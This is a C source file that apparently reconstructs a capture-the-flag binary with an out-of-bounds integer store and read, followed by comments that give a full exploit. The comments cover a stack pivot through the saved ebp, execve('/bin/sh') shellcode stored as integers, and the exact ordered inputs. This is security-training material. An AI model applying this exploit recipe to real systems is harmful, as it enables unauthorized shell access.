#include <libc.h>

int get_unum()
{
	int nb;
	fflush(stdout);
	scanf("%u", &nb);
	clear_stdin();
	return (nb);
}

int store_number(int *addr) {
	printf(" Number: ");
	int nb = get_unum(); //-0x10
	printf(" Index: ");
	int index = get_unum();//-0xc
	int ecx = index;
	int edx = 0xaaaaaaab;
	int eax = index;
	eax *= 0xaaaaaaab;
	edx = (ecx * 0xaaaaaaab) >> 32;
	edx >>= 1;
	eax = edx * 3;
	edx = index;
	edx -= eax;
	if ((index != ((index * 0xaaaaaaab) >> 0x1)*3)
		&& (nb >> 0x18 != 0xb7))
	{
		addr[index] = nb;
		return (0);
	}
	else {
		puts(" *** ERROR! ***");
		puts("   This index is reserved for wil!");
		puts(" *** ERROR! ***");
		return (1);
	}
}

int read_number(unsigned int *addr) {
	printf(" Index: ");
	unsigned int index = get_unum();
	printf(" Number at data[%u] is %u\n", index, addr[index]);
	return (0);
}

//On va faire un syscall sur execve dans notre storage
//
//
//
//le -11 segfault: on touche a ebp sauvegarder. il suffit de modifier l'ebp pour
//avoir une stack personnalisee
//read  -9: adresse de la ou on ecris.
//read 153: adresse argument
//
//
//0x80cd0bb0 == 2160921520  --> syscall to execve
//0xe1f7c931 == 3791112497  --> ecx et eax == 0
//0x6e69622f == 1852400175  == nib/
//0x0068732f ==    6845231  ==  hs/
//
//
//
//in -11 => store *(read -9) + 4*4 ----------------------------------------
//                                                                         |
//                                                                         |
//                                                                         |
//                                                                         |
//0                                                                        |
//+1   -> new esp   ==       *(read -9) + 1*4   && pop ebx == (addr stak sh| -> *(read -9) + 7*4)
//+2   -> pop esi               ^                                          |
// 3   -> pop edi               | lea    -0xc(%ebp),%esp   <----------------
//+4   -> new ebp   ==       *(read -9) + 4*4             && pop ebp
//+5   -> pop eip   => store *(addr shellcode syscall)
// 6
//+7   -> store(nib/ == 1852400175)
//+8   -> store( hs/ ==    6845231)
// 9
//+10  -> store(ecx/eax = 0 -> 3791112497)
//+11  -> store(syscall -> 2160921520)
//
//
//
//
//so in order:
//var addr = *(read -9)
//store (addr + 4*4) -11
//store (addr + 7*4) 1
//store (addr + 10*4) 5
//store (1852400175) 7
//store (6845231) 8
//store (3791112497) 10
//store (2160921520) 11
//quit
